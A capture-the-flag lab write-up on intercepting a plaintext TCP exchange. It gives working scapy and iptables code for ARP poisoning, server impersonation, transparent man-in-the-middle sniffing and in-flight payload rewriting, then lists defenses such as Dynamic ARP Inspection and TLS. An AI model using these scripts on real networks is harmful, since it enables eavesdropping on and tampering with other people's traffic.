# TCP Connection Interception

Field notes for the TCP variant of the `interceptor_communication` lab, and for
intercepting a plaintext TCP exchange on a LAN in general.

Companion to [`udp-spoofing.md`](udp-spoofing.md). Read that one first if you want the
"why source addresses are not identity" background — this doc assumes it and focuses on
what changes when the target speaks **TCP**.

---

## TL;DR

The client opens a **real TCP connection** to the server and sends the flag over it
([`run:18-20`](../pwn/interceptor_communication/run#L18-L20)). You cannot grab the flag
by forging a single packet the way you can with UDP, because TCP will not deliver the
payload until a **three-way handshake** completes. So interception becomes two problems:

1. **Get on-path** — make the client's packets come to *you* instead of the server.
   On a switched/bridged LAN that means **ARP spoofing** the client so `10.0.0.3`
   resolves to *your* MAC.
2. **Be the server** — complete the handshake as `10.0.0.3:31337` and `recv()` the
   flag. Either hand the IP to your kernel and run a normal socket server, or answer
   the handshake yourself with scapy.

The client retries every second ([`run:16`](../pwn/interceptor_communication/run#L16)),
so you get unlimited attempts — interception does not have to win on the first packet.

---

## 1. The lab

```
        ARP: "10.0.0.3 is at <server MAC>"   <-- we overwrite this
   ┌─────────────┐        TCP SYN -> 10.0.0.3:31337        ┌─────────────┐
   │   client    │  ───────────── flag ──────────────────▶ │   server    │
   │  10.0.0.2   │                                          │  10.0.0.3   │
   └─────────────┘                                          └─────────────┘
          │                                                        ▲
          │                 ┌─────────────┐                        │
          └───────────────▶ │  user (you) │ ───── impersonate ─────┘
          poisoned ARP      │  10.0.0.1   │        10.0.0.3:31337
          points here       │   (root)    │
                            └─────────────┘
```

What [`run`](../pwn/interceptor_communication/run) sets up:

| Line | Behaviour |
|---|---|
| [`run:18-20`](../pwn/interceptor_communication/run#L18-L20) | Client connects to `10.0.0.3:31337` and `sendall`s the flag, once per second |
| [`run:27-34`](../pwn/interceptor_communication/run#L27-L34) | Server binds `0.0.0.0:31337`, accepts, `recv(1024)`, closes — it never checks *who* connected |
| [`run:38`](../pwn/interceptor_communication/run#L38) | You are `user_host` = `10.0.0.1`, running with the parent's effective uid — **root**, so `CAP_NET_RAW` is available |

The server authenticates nothing. The flag is protected only by the fact that packets
for `10.0.0.3` normally reach the real server. Break that assumption and the flag is yours.

---

## 2. Why the UDP trick doesn't port over

| | UDP variant | TCP variant (this lab) |
|---|---|---|
| Deliver payload | one `sendto` / one forged datagram | only **after** SYN → SYN-ACK → ACK |
| "Be the server" | bind a socket, `recvfrom` | must answer the handshake with the right seq/ack |
| Blind spray works? | yes (forge replies to every port) | no — a half-open handshake carries no data |
| Getting on-path | sometimes unneeded (you forge, you don't receive) | **required** — the flag flows *to* the server's address |

With UDP you could forge the *server's replies* and never need the client's traffic to
reach you. Here the thing you want (the flag) travels **to** `10.0.0.3`, so you must
make `10.0.0.3`'s traffic arrive at your host. That is the ARP-spoofing step, and it is
the heart of the challenge.

### Does the traffic even reach me on its own?

No. dojjail wires the hosts through a **learning bridge**, so a unicast
`client → server` frame is only forwarded out the server's port once the bridge has
learned its MAC. You will *not* see it by passively sniffing (this is the same
"learning bridge" caveat called out in
[`udp_spoofing_4_spray.py`](../pwn/interceptor_communication/udp_spoofing_4.py)).
ARP spoofing fixes this: once the client believes `10.0.0.3` is at *your* MAC, it
addresses the frames to you and the bridge forwards them to your port.

---

## 3. Step one: ARP-poison the client

Continuously tell the client that `10.0.0.3` lives at our MAC. We send it in a loop so
our mapping overwrites the real one and stays fresh (the real server may re-announce).

```python
# arp_poison.py  — run as root inside ./run
import time
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, conf

IFACE  = conf.iface                 # the lab interface (usually the only non-lo one)
CLIENT = "10.0.0.2"
SERVER = "10.0.0.3"
MY_MAC = get_if_hwaddr(IFACE)

# op=2 is an ARP *reply* ("is-at"). We assert: SERVER is at MY_MAC.
poison = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2, psrc=SERVER, hwsrc=MY_MAC, pdst=CLIENT
)

print(f"[*] poisoning {CLIENT}: {SERVER} is-at {MY_MAC} via {IFACE}")
while True:
    sendp(poison, iface=IFACE, verbose=0)
    time.sleep(1)
```

Run this in the background (`python arp_poison.py &`) and leave it running the whole
time — if it stops, the client's cache re-learns the real server and interception dies.

> If you don't know the interface name: `ip -br link` inside the `./run` shell, or just
> trust `conf.iface`. The client's MAC, if you ever need it, is in `ip neigh` after the
> first poison round.

---

## 4. Step two, option A — claim the IP and run a normal server (simplest)

Once the client's frames come to your MAC, the cleanest way to complete the handshake is
to let **your own kernel** own `10.0.0.3` and run an ordinary TCP server. The kernel does
all the seq/ack bookkeeping; you just `recv()`.

```python
# impersonate_ipalias.py  — run as root, AFTER arp_poison.py is running
import os, socket

IFACE = "eth0"          # set to the lab interface from `ip -br link`
SERVER = "10.0.0.3"
PORT   = 31337

# Add 10.0.0.3 as a second address on our interface.
os.system(f"ip addr add {SERVER}/24 dev {IFACE}")
try:
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((SERVER, PORT))
    srv.listen()
    print(f"[*] impersonating {SERVER}:{PORT} — waiting for the client...")
    while True:
        conn, addr = srv.accept()
        data = conn.recv(1024)
        conn.close()
        if data.strip():
            print(f"[+] FLAG from {addr[0]}:{addr[1]}: {data.decode(errors='replace')}")
            break
finally:
    os.system(f"ip addr del {SERVER}/24 dev {IFACE}")   # clean up the alias
```

Why it works: with the ARP cache poisoned, the client's SYN arrives on your wire with
**dst IP `10.0.0.3`**; because that IP is now assigned to your interface, your kernel
accepts it, completes the handshake, and `accept()`/`recv()` hand you the flag. The real
server never sees the connection.

**Gotcha — the ARP race.** Assigning the IP makes your kernel answer ARP for `10.0.0.3`
too, and the real server still answers for itself. That's exactly why the poison loop in
§3 must keep running: it force-feeds the client *your* mapping faster than either kernel
can correct it. Keep both scripts alive together.

---

## 5. Step two, option B — answer the handshake with scapy (no reconfig)

If you'd rather not touch the interface config (or the lab blocks `ip addr add`), do the
TCP handshake by hand. One catch: your kernel will see SYN-ACK/data for an IP+port it
doesn't own and blast a **RST**, tearing down the connection before you read anything.
Block outbound RSTs first:

```bash
iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
```

Then let scapy be the server. We answer the SYN with a SYN-ACK, wait for the client's
data, and ACK it:

```python
# impersonate_scapy.py  — run as root, AFTER arp_poison.py, AND the iptables rule above
from scapy.all import IP, TCP, sniff, send

SERVER, PORT = "10.0.0.3", 31337

def handle(pkt):
    if not (pkt.haslayer(TCP) and pkt[IP].dst == SERVER and pkt[TCP].dport == PORT):
        return
    ip, tcp = pkt[IP], pkt[TCP]
    client, sport = ip.src, tcp.sport

    # 1) client SYN  -> our SYN-ACK
    if tcp.flags == "S":
        synack = IP(src=SERVER, dst=client) / TCP(
            sport=PORT, dport=sport, flags="SA",
            seq=1000, ack=tcp.seq + 1)
        send(synack, verbose=0)
        return

    # 2) client's data (PSH/ACK carrying the flag) -> read it, then ACK
    if "P" in tcp.flags and pkt.haslayer("Raw"):
        payload = bytes(pkt["Raw"].load)
        print(f"[+] FLAG from {client}:{sport}: {payload.decode(errors='replace')}")
        ack = IP(src=SERVER, dst=client) / TCP(
            sport=PORT, dport=sport, flags="A",
            seq=tcp.ack, ack=tcp.seq + len(payload))
        send(ack, verbose=0)

print(f"[*] scapy-impersonating {SERVER}:{PORT} ...")
sniff(filter=f"tcp and dst host {SERVER} and dst port {PORT}", prn=handle, store=0)
```

Remove the rule when you're done: `iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP`.

Option A is more robust (the kernel handles retransmits, window, teardown); option B is
good to understand because it shows exactly which packets make a TCP "connection" and how
little of it is identity.

---

## 6. Variant — transparent MITM (forward and sniff)

If you wanted the exchange to keep working (e.g. to stay stealthy, or to read a
*bidirectional* protocol), don't impersonate — **relay**. ARP-spoof *both* directions so
each host thinks you are the other, enable forwarding, and read the plaintext as it
passes through:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward      # forward instead of dropping
# poison client (10.0.0.3 is-at us) AND server (10.0.0.2 is-at us); then:
tcpdump -nAi eth0 'tcp port 31337'          # flag appears in cleartext
```

Overkill for just grabbing a flag that's pushed to a server that never replies — but it's
the real-world shape of a man-in-the-middle, and the one that works when you need the
connection to survive.

---

## 7. Modifying the stream in flight (not just reading it)

§6 forwards and *reads*. To **change** bytes as they pass — the "modify the payload in the
middle" case — you have two options, and TCP adds a catch UDP doesn't.

### The TCP catch: sequence numbers

TCP numbers every byte. Rewrite a segment to a **different length** and every later segment's
seq/ack is off by that delta, so the two stacks desync and the connection stalls or resets.
So in-place editing is only safe when the edit **keeps the length identical** (swap a token
for an equal-size one, flip a byte). Checksums still need recompute either way.

### Option A — in-place rewrite with NFQUEUE (equal-length edits)

Divert the forwarded segment to userspace, edit it, let the kernel send your version:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -A FORWARD -p tcp --dport 31337 -j NFQUEUE --queue-num 0
```

```python
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

def cb(nfp):
    p = IP(nfp.get_payload())
    if p.haslayer(Raw):
        load = p[Raw].load
        if b"hello" in load:
            p[Raw].load = load.replace(b"hello", b"world")   # SAME length
            del p[IP].len, p[IP].chksum, p[TCP].chksum        # force recompute
            nfp.set_payload(bytes(p))
    nfp.accept()

nfq = NetfilterQueue(); nfq.bind(0, cb); nfq.run()
```

Keep it equal-length — otherwise you must also fix seq/ack on every subsequent packet, which
NFQUEUE alone won't do.

### Option B — split-connection proxy (arbitrary-length edits)  ← the "proxy" you asked about

The clean way to change length freely: don't forward packets at all. **Terminate** the
client's connection and open your **own** connection to the real server, then shuttle bytes
between the two sockets, editing as you like. Each side is an independent TCP stream, so each
kernel owns its seq/ack and your edits can grow or shrink the data with no desync.

```python
# after ARP-poison + claiming 10.0.0.3 (as in §4): accept the client, dial the real server
import socket
victim, _ = listen_sock.accept()                  # client believes we are 10.0.0.3
upstream  = socket.create_connection((REAL_SERVER_IP, 31337))
data = victim.recv(4096)
data = data.replace(b"FOO", b"BARBAZ")             # any length is fine here
upstream.sendall(data)
# relay/edit the reverse direction too for a bidirectional protocol
```

This *is* "make A talk to a proxy, then reach B." You can't **reconfigure** A to use a proxy
(you don't control it), so you **impersonate B at L2/L3** (ARP + IP, §3–§4) to pull A's
connection to you, then act as the client to the real B. Same move as §4, now rewriting in
the middle.

### Which one for *this* lab?

Neither — the client only `sendall(flag)` then `close()`s and never reads a reply
([`run:19-21`](../pwn/interceptor_communication/run#L19-L21)), so there is nothing to modify;
you just **capture** (§4). Reach for §7 when a later challenge has the client *act on* the
server's response — then you rewrite that response in flight.

---

## 8. Putting it together

```
# inside the ./run shell (you are 10.0.0.1, root)
python arp_poison.py &          # §3 — keep this running
python impersonate_ipalias.py   # §4 — prints the flag and exits
```

Checklist if nothing arrives:

- [ ] Is `arp_poison.py` still running? Check `ip neigh` on the client view — `10.0.0.3`
      should map to **your** MAC. If it flips back, poison faster / confirm it didn't crash.
- [ ] Right interface? `conf.iface` vs. what `ip -br link` shows. Scapy's BPF filter and
      your `IFACE` must match the lab link, not `lo`.
- [ ] Option B only: did the kernel RST the connection? Confirm the
      `iptables ... RST ... DROP` rule is in place (`iptables -S OUTPUT`).
- [ ] Port binding (option A): if `bind` fails, another process holds the alias/port —
      `SO_REUSEADDR` is set, but also make sure you deleted a stale `ip addr add` from a
      previous run.
- [ ] Give it a few seconds — the client only tries once per second
      ([`run:16`](../pwn/interceptor_communication/run#L16)).

---

## 9. Why this works / how a real system would stop it

The interception succeeds because of a chain of unverified trust:

- **ARP has no authentication** — any host can claim any IP's MAC. (Defenses: static ARP
  entries, DHCP snooping + Dynamic ARP Inspection on managed switches, port security.)
- **The server authenticates no one** — it `recv`s from whoever completes a handshake
  ([`run:32-33`](../pwn/interceptor_communication/run#L32-L33)). A real service would
  require the *client* to verify the server's identity before sending secrets.
- **The flag is sent in cleartext** — nothing would be gained from interception if the
  channel were encrypted and the server's key were pinned. **TLS with certificate
  validation** is the actual fix: even a perfect MITM then only sees ciphertext, and a
  forged server can't present a trusted certificate for `10.0.0.3`.

Interception here is an *integrity/identity* failure at two layers (L2 ARP, L7 app), not a
memory-corruption bug — the exploit is "the network believed me."

---

## Appendix — quick reference

| Need | Command / call |
|---|---|
| Lab interface name | `ip -br link` / `conf.iface` |
| Your MAC | `get_if_hwaddr(iface)` |
| ARP reply "SERVER is-at me" | `ARP(op=2, psrc=SERVER, hwsrc=MY_MAC, pdst=CLIENT)` |
| Claim the server IP | `ip addr add 10.0.0.3/24 dev <iface>` |
| Drop kernel RSTs (option B) | `iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP` |
| Watch cleartext | `tcpdump -nAi <iface> 'tcp port 31337'` |
| Inspect ARP cache | `ip neigh` |
| Modify in-place (equal len) | `iptables -j NFQUEUE` + scapy; `del IP.len, IP.chksum, TCP.chksum` |
| Modify any length | split-connection proxy: accept client, dial real server, rewrite bytes |
